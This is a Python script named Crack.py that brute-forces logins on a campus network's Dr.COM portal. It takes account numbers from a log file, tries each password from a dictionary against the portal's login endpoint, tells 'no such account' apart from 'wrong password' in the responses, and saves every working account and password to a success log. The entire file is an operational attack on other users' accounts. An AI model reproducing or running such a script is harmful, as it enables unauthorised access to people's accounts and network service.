# -*- coding = UTF-8 -*-
# @Time : 2021/12/4 下午2:55
# @Author : XIADENGMA
# @File : Crack.py
# @Software : PyCharm
# @achieve : 定向密码爆破
# @version : 1.0.0
# @note:很慢 很慢 真的很慢

import socket
import requests
import time
import re
import concurrent.futures

pswError = open("/home/xiadengma/code/个人项目/python/NCIST-Drcom-Auto/pswErrorLog.txt", "r")
pswDict = open("/home/xiadengma/code/个人项目/python/NCIST-Drcom-Auto/PasswordDict.txt", "r")

re_account = "(?<=[\u8d26\u53f7]{1}:{1})[0-9]{9}"  # 匹配'账号:'后面的9个数 (?<=[\u8d26\u53f7]{1}:{1})[0-9]{9}
re_password = "(?<=[\u5bc6\u7801]{1}:{1})[0-9]{6}"  # 匹配'密码:'后面的6个数(?<=[\u5bc6\u7801]{1}:{1})[0-9]{6}

# 获取局域网ip
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    ip = s.getsockname()[0]
    s.close()
    print("本机ip：" + ip)
except:
    print("获取局域网ip失败:请检查Wi-Fi是否连接正确")
    exit()

for line_1 in pswError.readlines():  # 依次读取每行
    line_1 = line_1.strip()  # 去掉每行头尾空白

    for line_2 in pswDict.readlines():  # 依次读取每行
        line_2 = line_2.strip()  # 去掉每行头尾空白

        final_account = str(re.search(re_account, line_1).group(0))
        final_password = str(line_2)

        # 校园网请求地址&账号&密码
        url = "http://10.200.0.2:801/eportal/"

        # 请求标头
        headers = {
            'Connection': 'keep-alive',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.81',
            'DNT': '1',
            'Accept': '*/*',
            'Referer': 'http://10.200.0.2/',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        }

        # 参数
        params = (
            ('c', 'Portal'),
            ('a', 'login'),
            ('callback', 'dr1003'),
            ('login_method', '1'),
            ('user_account', final_account),
            ('user_password', final_password),
            ('wlan_user_ip', ip),
            ('wlan_user_ipv6', ''),
            ('wlan_user_mac', '000000000000'),
            ('wlan_ac_ip', ''),
            ('wlan_ac_name', ''),
            ('jsVersion', '3.3.1'),
            ('_', '000000000000'),
        )

        try:
            with concurrent.futures.ProcessPoolExecutor() as executor:
                # 连接校园网
                response = requests.get(url, headers=headers, params=params, verify=False, timeout=1)

            # 校园网登录状态判断
            if r'\u8ba4\u8bc1\u6210\u529f' in response.text:
                print("登录成功")
                print("当前帐号:{0}\n当前密码:{1}\n".format(final_account, final_password))

                t = time.localtime()
                file = open("/home/xiadengma/code/个人项目/python/NCIST-Drcom-Auto/successLog.txt", "a+", encoding='utf-8')
                file.write(
                    "{0}年{1}月{2}日{3}时{4}分{5}秒:  帐号:{6}  密码:{7}\n".format(t.tm_year, t.tm_mon, t.tm_mday, t.tm_hour,
                                                                         t.tm_min, t.tm_sec, final_account,
                                                                         final_password))
                file.close()

                break  # 爆破打开
            elif r'dXNlcmlkIGVycm9yMQ==' in response.text:
                print("连接校园网失败:帐号不存在 当前账号:{0} 当前密码:{1}".format(final_account, final_password))
            elif r'bGRhcCBhdXRoIGVycm9y' in response.text:
                print("连接校园网失败:密码错误 当前账号:{0} 当前密码:{1}".format(final_account, final_password))
            elif r'SW4gdXNlICE=' in response.text:
                print("连接校园网失败:终端IP已经在线 当前账号:{0} 当前密码:{1}".format(final_account, final_password))
            else:
                print("连接校园网失败{0} 当前账号:{1} 当前密码:{2}".format(response.text, final_account, final_password))
        except:
            print("连接校园网错误")
